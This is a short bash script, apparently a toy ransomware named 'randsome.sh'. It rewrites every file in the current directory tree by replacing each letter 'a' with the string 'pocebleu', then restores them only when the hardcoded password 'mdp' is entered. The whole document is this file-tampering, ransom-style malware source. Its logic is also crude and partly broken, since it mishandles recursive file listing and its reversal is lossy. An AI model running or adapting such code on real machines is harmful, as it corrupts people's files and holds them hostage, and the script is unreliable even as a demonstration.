#! /bin/bash

crypt()
{
 cat $i | sed 's/a/pocebleu/g' > $i.tmp
 cat $i.tmp > $i
 rm $i.tmp

}
decrypt()
{
 cat $i | sed 's/pocebleu/a/g' > $i.tmp
 cat $i.tmp > $i
 rm $i.tmp

}
init()
{
    cat .pocebleu 2> /dev/null
    b=$?
    if [ $b -eq 1 ]; then  
        for i in $(ls -R ./) 
        do
            if [ "$i" != "randsome.sh" ];
            then
                crypt $i
            fi
        done
        echo pocebleu > .pocebleu
    else
        read pb
        if [ "$pb" == "mdp" ];
        then
            for i in $(ls -R ./) 
            do
                if [ "$i" != "randsome.sh" ];
                then
                    decrypt $i
                fi
            done
            rm .pocebleu
        else
            echo "Wrong password"
        fi 
    fi
}
init
